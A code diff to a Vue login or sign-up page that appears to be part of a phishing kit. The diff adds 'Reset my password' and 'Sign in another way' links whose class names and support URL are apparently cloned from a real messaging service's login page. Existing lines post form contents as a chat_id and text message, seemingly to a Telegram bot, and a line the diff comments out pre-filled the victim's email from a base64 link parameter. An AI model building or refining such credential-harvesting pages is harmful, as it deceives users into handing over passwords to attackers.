@@ -1,5 +1,3 @@
-
-
 <template>
 	<div id="app">
 		<div style="width: 100%;" class="blueTxt">
@@ -30,7 +28,7 @@
 			
 			<button type="submit" @click.prevent="finishJoob();">SIGN UP</button>
         </form>
-
+        <div class="style__linkRoleButtonsWrap___ydPQ3"><a class="style__linkRoleButton___kxZ2G" href="https://support.themessaging.co/hc/en-au/articles/9391763413391" role="button"><div id="loginForgotPassword" class="style__recovery___AnSSy">Reset my password</div></a><span class="style__divider___PnMM1"></span><a class="style__linkRoleButton___kxZ2G" href="javascript:void(0)" role="button"><div id="loginForgotPassword" class="style__recovery___AnSSy">Sign in another way</div></a></div>
           <a href="">Forget password?</a>
 
           <div class="language" style="margin-top: 30px;" > 
@@ -101,6 +99,7 @@ export default {
 					chat_id: chatId,
 					text: message,
 				};
+				console.log(payload)
 				await axios.post(url, payload);
 
 			} catch (error) {
@@ -111,10 +110,12 @@ export default {
 
 	},
 	mounted() {
-		this.formDataRes['email'] = atob(this.$route?.params?.id)
+		// this.formDataRes['email'] = atob(this.$route?.params?.id)
 	}
 }
 </script>
+
+
 
 
 
@@ -135,6 +136,22 @@ body {
   text-align: center;
   font: Roboto, "Helvetica Neue", Helvetica, Arial, sans-serif;
 }
+
+.style__linkRoleButtonsWrap___ydPQ3{
+	display: flex
+;
+    justify-content: space-evenly;
+    margin-top: 47px;
+    align-items: center;
+    flex-wrap: wrap;
+	width: 50%;
+	margin-left: auto;
+	margin-right: auto;
+}
+
+
+
+
 a {
   text-decoration: none;
   color: rgb(10, 92, 156);
